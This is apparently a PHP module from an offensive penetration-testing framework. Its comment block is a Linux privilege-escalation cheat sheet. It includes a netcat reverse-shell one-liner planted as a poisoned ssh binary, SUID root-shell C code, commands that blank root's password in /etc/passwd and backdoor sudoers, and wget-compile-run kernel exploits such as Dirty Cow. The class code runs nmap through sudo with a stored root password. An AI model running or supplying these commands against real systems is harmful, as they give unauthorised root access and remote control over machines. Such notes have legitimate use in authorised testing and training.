<?php


/*
https://github.com/0x00-0x00/ShellPop
https://ired.team/offensive-security-experiments/offensive-security-cheetsheets

https://www.hackingarticles.in/penetration-testing/

// Docker priv escal 
 */
/*
 Which of the following commands shows you all of the network services running on Windows-based servers?
 A. Net start
 B. Net use
 C. Net Session
 D. Net share
 Correct Answer: A


 hardcode MAC Address
 C:\> arp -s 192.168.1.130 AA:BB:CC:DD:EE:FF
 
 
 A passive OS fingerprinting tool is just a sniffer and some intelligence to analyze the packets gathered by the sniffer. It’s a passive fingerprinter, because it sends
no traffic on the network; it just receives packets
using a built-in sniffer.



find $(pwd) -type f : chemin absolu 
find . -type f : chemin relatif 







if you can just change PATH, the following will add a poisoned ssh binary:

set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
chmod +x ssh

Generating SUID C Shell for /bin/sh

int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}

Without interactive shell

$ echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/sh");\n}' > setuid.c

If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:

$ chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;

If /etc/passwd has incorrect permissions, you can root:

$ echo 'root::0:0:root:/root:/bin/sh' > /etc/passwd; su

Add user www-data to sudoers with no password

$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

If you can sudo chmod:

$echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/sh");\n}' > setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid

Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:

https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562

compile exploit fix error

$ gcc 9545.c -o 9545 -Wl,--hash-style=both

Find other uses in the system

$id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l

World readable/writable files:

$ echo "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;

Find world-readable files:

$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print

Find nobody owned files

$ find /dir -xdev \( -nouser -o -nogroup \) -print

Add user to sudoers in python.

#!/usr/bin/env python
import os
import sys
try:
os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
sys.exit()

Ring0 kernel exploit for 2.3/2.4

wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0

Inspect web traffic

$ tcpdump tcp port 80 -w output.pcap -i eth0



http://blog.sevagas.com/IMG/pdf/exploiting_capabilities_the_dark_side.pdf
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://bitvijays.github.io/LFC-VulnerableMachines.html
https://itblogr.com/hack-the-box-walkthrough-solutions/


*/



class LAN extends SERVICE4COM{

    var $stream ;
	var $lan2domain;
	var $lan2ip;
	var $lan2workgroup ;
	var $network_range;
	var $network_eth_lan ;
	var $network_ip_lan ;
	var $network_dns;
	var $network_gw ;
	var $network_ip_wan ;

	
	



	
	
	

	/*
	 http://tools.kali.org/information-gathering/fragroute
	 http://tools.kali.org/stress-testing/inundator
	
	 In a fraggle DoS attack, an attacker sends a large amount of UDP echo requests traffic to the IP broadcast addresses. These UDP requests have a spoofed
	 source address of the intended victim. If the routing device delivering traffic to those broadcast addresses delivers the IP broadcast to all the hosts, most of the IP
	 addresses send an ECHO reply message. However, on a multi-access broadcast network, hundreds of computers might reply to each packet when the target
	 network is overwhelmed by all the messages sent simultaneously. Due to this, the network becomes unable to provide services to all the messages and crashes.
	 In a Land attack, the attacker sends a spoofed TCP SYN packet in which the IP address of the target is filled in both the source and detination fields. On recieving
	 the spoofed packet, the target system becomes confused and goes into a frozen state. Now-a-days, antivirus can easily detect such an attack.
	
https://bitvijays.github.io/LFC-VulnerableMachines.html	











Exploits worth running

CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

https://www.exploit-db.com/exploits/15285/

Linux Kernel <= 2.6.37 'Full-Nelson.c'

https://www.exploit-db.com/exploits/15704/

CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

https://git.zx2c4.com/CVE-2012-0056/about/

Linux CVE 2012-0056

wget -O exploit.c <http://www.exploit-db.com/download/18411>
  gcc -o mempodipper exploit.c
  ./mempodipper

CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

https://dirtycow.ninja/

Compile dirty cow:

 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil












test on restricted bash 

rbash
rksh
rzsh
lshell
 
 https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
 https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
 
 https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
 
 
         
 


  
  # fpipe
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)


Is tunnelling possible? Send commands locally, remotely
ssh -D 127.0.0.1:9050 -N [username]@[ip] 
proxychains ifconfig


         
	 */
	
	
	public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {
	    parent::__construct($eth,$domain,$ip,$port,$protocol);


	    // 

	    if (!is_resource($stream)) {
	        $this->rouge('LAN: Socket Failed');
	        exit();
	    }
	    if (is_resource($stream)) {
	        $this->stream = $stream;	
	        
	        //var_dump($this->stream);echo get_resource_type($this->stream);$this->pause();
	    }
	    
	   
	   
	}

	
	
	public function lan2pentest($rport,$rpotocol,$templateB64_cmd,$templateB64_shell,$data,$time2wait){
	    $templateB64_cmd = trim($templateB64_cmd);
	    $templateB64_shell = trim($templateB64_shell);
	    
	    $time2wait = trim($time2wait);
	    $whois = "listening_Server";
	    $time2sleep = 5;
	    ;
	    $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $rport $rpotocol $templateB64_cmd $templateB64_shell server $time2wait $whois\" ";
	    $query1 = "xterm -T '$cmd1' -e '$cmd1' 2> /dev/null ";
	    //$cmd2 = "php exec/exec.lan.php '$this->eth' '$this->domain' '$this->ip' '$this->port' '$this->protocol' '$this->stream' '$file_data' ";
	    $this->article("CMD1", $cmd1);
	    $this->article("CMD2 on stream", $data);
	    
	    if (! function_exists('pcntl_fork')) $this->rouge('PCNTL functions not available on this PHP installation');
	    $pid = pcntl_fork();
	    
	    if ($pid == -1) {
	        $this->rouge('duplication impossible');
	    } else if ($pid) {
	        // le père
	        //$this->stream8client($port_rev2, $info);
	        //$this->stream8server($rport,$rpotocol, $infos_base64,$whois, $time2wait);
	        exec($query1);
	        //pcntl_wait($status); // Protège encore des enfants zombies
	    } else {
	        // le fils
	        sleep($time2sleep);
	        $this->lan2stream4result($data,$time2wait);
	        //system ( $query2 );
	    }
	    
	    	    
	}
	
	
	

	    
	    public function lan2exit(){
	        $result = "";
	        $result .= $this->ssTitre(__FUNCTION__);
	        $data = "logout";
	        $this->lan2stream4result($data,$this->stream_timeout,"");
	        $data = "exit";
	        $this->lan2stream4result($data,$this->stream_timeout,"");
	        $data = "quit";
	        $this->lan2stream4result($data,$this->stream_timeout,"");
	        fclose($this->stream);
	        return $result;
	    }
	    

    
	  
	
	
	

	
	
	    
	public function lan2dot(){
		$this->ssTitre(__FUNCTION__);
	}
	
	public function lan2router(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "cisco-ocs  $this->lan2ip_range -e $this->eth_lan  ";
	    return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	public function lan2mac(){
		$this->ssTitre(__FUNCTION__);
		$query = "echo '$this->root_passwd' | sudo -S nmap -sn  $this->lan2ip_range -e $this->eth_lan | grep 'MAC' -B3 ";
return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	public function lan2hosts(){
		$this->ssTitre(__FUNCTION__);
		$query = "echo '".$this->lan2mac()."' | grep -Po \"\([0-9a-zA-Z_-]{1,}\.[0-9a-zA-Z_-]{1,}\)\" ";
return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	public function lan2live(){
		$this->ssTitre(__FUNCTION__);
		$query = "echo '".$this->lan2mac()."' | grep -Po \"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\" ";
return $this->req2BD(__FUNCTION__,__CLASS__,"domain = '$this->lan2domain' AND lan2range = '$this->lan2ip_range'",$query);
	}
	
	
	
	
	
	
	public function lan2scan4idle(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap --script ipidseq -s$this->protocol -p $this->port $this->ip -e $this->eth"; // [port]
	    return $this->req_ret_str($query);
	}
	
	
	
	
	
	
	
		
	
}
?>